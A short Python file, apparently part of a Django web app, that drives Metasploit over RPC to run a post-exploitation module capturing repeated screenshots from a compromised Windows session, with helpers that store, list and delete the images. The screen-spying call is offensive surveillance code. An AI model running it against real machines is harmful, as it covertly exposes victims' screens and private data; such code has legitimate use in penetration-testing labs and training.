from metasploit.msfrpc import MsfRpcClient

import anssi.settings
import os

def post_take_screenshot(client, session, path, count, delay, record, view_screenshots):
    post = client.modules.use('post', 'windows/gather/homemade_screen_spy')
    post['SESSION'] = session
    post['PATH'] = path
    post['COUNT'] = count
    post['DELAY'] = delay
    post['RECORD'] = record
    post['VIEW_SCREENSHOTS'] = view_screenshots
    post.execute()


def get_screenshot_path(screenshot_id):
    return os.path.join(anssi.settings.MEDIA_ROOT, "screenshots", "screenshot{}.png".format(screenshot_id))


def remove_screenhots():
    screenshots_path = os.path.join(anssi.settings.MEDIA_ROOT, "screenshots")

    for root, dirs, files in os.walk(screenshots_path):
        for name in files:
            full_path = os.path.join(screenshots_path, name)
            os.remove(full_path)


def get_images_url(screenshot_id, screenshot_number):
    images = []
    path = os.path.join(anssi.settings.MEDIA_URL, "screenshots")

    for i in range(screenshot_id, screenshot_number + screenshot_id):
        filename = "screenshot{}.png".format(i % screenshot_number)
        images.append(os.path.join(path, filename))


    images.reverse()
    return images
